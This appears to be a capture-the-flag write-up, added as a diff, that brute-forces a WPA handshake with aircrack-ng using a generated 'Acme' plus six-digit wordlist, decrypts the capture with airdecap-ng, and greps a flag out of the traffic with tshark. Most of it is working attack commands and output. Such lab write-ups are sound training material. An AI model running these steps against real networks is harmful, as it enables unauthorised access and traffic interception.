@@ -1,0 +1,66 @@
+To find Acme-WiFi BSSID, the first part of the output:
+❯ aircrack-ng capture-7.pcap
+Reading packets, please wait...
+Opening capture-7.pcap
+Read 2465 packets.
+
+   #  BSSID              ESSID                     Encryption
+
+   1  00:1A:1E:C1:76:50  Acme-WiFi                 WPA (1 handshake)
+   2  74:83:C2:C1:88:7F  Acme_WiFi                 WPA (1 handshake)
+
+To bruteforce the second half of the selected BSSID (1):
+❯ python3 -c 'print("\n".join(f"Acme{i:06d}" for i in range(1000000)))' | aircrack-ng -w - -b 00:1A:1E:C1:76:50 capture-7.pcap
+
+  
+                               Aircrack-ng 1.7 
+
+
+                   [00:01:32] 662952 keys tested (7299.63 k/s) 
+
+
+                          KEY FOUND! [ Acme676196 ]
+
+
+      Master Key     : AC BB C1 70 3F 2C 80 B2 B4 9A 09 C3 72 F4 CC 69 
+                       31 DE 34 91 13 F7 E5 B1 7E B0 10 D2 3B D4 F9 0B 
+
+      Transient Key  : 30 F4 11 70 50 6E B6 00 00 00 00 00 00 00 00 00 
+                       00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
+                       00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
+                       00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
+
+      EAPOL HMAC     : 31 77 A9 C9 1A 9E 8F 2F B1 57 EA A8 42 30 45 FF 
+
+
+Traceback (most recent call last):
+  File "<string>", line 1, in <module>
+    print("\n".join(f"Acme{i:06d}" for i in range(1000000)))
+    ~~~~~^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+BrokenPipeError: [Errno 32] Broken pipe
+
+(The error is due to the pipeline being aborted by aircrack-ng when the password is found.)
+
+To decrypt the capture file:
+❯ airdecap-ng -p Acme676196 -e Acme-WiFi capture-7.pcap
+Total number of stations seen            5
+Total number of packets read          2465
+Total number of WEP data packets         0
+Total number of WPA data packets        78
+Number of plaintext data packets         0
+Number of decrypted WEP  packets         0
+Number of corrupted WEP  packets         0
+Number of decrypted WPA  packets        48
+Number of bad TKIP (WPA) packets         0
+
+To search for the "netsec" string in the decrypted file:
+❯ tshark -r capture-7-dec.pcap -Y 'frame contains "netsec{"' -V | grep -i -C 5 "netsec{"
+        [Content length: 63]
+    \r\n
+    [Full request URI: http://intranet.acme.test/api/notes]
+    File Data: 63 bytes
+Line-based text data: text/plain (1 lines)
+    Wi-Fi audit, remember: netsec{81633e18c549f8cab9462eedef7edd0f}
+
+
+
